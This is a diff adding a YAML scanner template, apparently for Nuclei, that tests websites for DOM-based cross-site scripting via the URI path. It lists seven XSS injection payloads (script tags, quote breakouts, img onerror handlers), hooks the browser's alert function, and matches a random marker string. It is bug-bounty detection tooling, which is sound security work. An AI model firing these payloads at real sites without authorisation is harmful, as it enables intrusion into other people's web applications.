@@ -1,0 +1,65 @@
+id: bugbounty-xss-in-uri-path
+
+info:
+  name: XSS Via URI Path
+  author: Justin Washek
+  severity: high
+  description: |
+    Tests for DOM-based XSS using a unique alert string in multiple injection vectors.
+  tags: xss,headless,domxss,alert,custom
+
+variables:
+  xss1: "/?fake</script><script>alert('{{randstr_1}}')</script>&param=1"
+  xss2: "/?fake'-alert('{{randstr_1}}')-'&param=1"
+  xss3: "/?fake'><script>alert('{{randstr_1}}')</script>///param=1"
+  xss4: "/\"><script>alert('{{randstr_1}}')</script>"
+  xss5: "/#'\"><img src=x onerror=alert('{{randstr_1}}')>"
+  xss6: "/<script>alert('{{randstr_1}}')</script>"
+  xss7: "/\"><img src=x onerror=alert('{{randstr_1}}')>"
+
+headless:
+  - payloads:
+      xss:
+        - "{{xss1}}"
+        - "{{xss2}}"
+        - "{{xss3}}"
+        - "{{xss4}}"
+        - "{{xss5}}"
+        - "{{xss6}}"
+        - "{{xss7}}"
+
+    steps:
+      - action: script
+        name: hook_alert
+        args:
+          code: |
+            () => {
+              window.alert_value = null;
+              window.alert = function(msg) {
+                window.alert_value = msg;
+              };
+            }
+
+      - action: navigate
+        args:
+          url: "{{BaseURL}}{{xss}}"
+
+      - action: waitload
+
+      - action: script
+        name: alertlog
+        args:
+          code: |
+            () => window.alert_value
+
+    matchers:
+      - type: word
+        part: alertlog
+        words:
+          - "{{randstr_1}}"
+
+    extractors:
+      - type: kval
+        part: alertlog
+        kval:
+          - alertlog
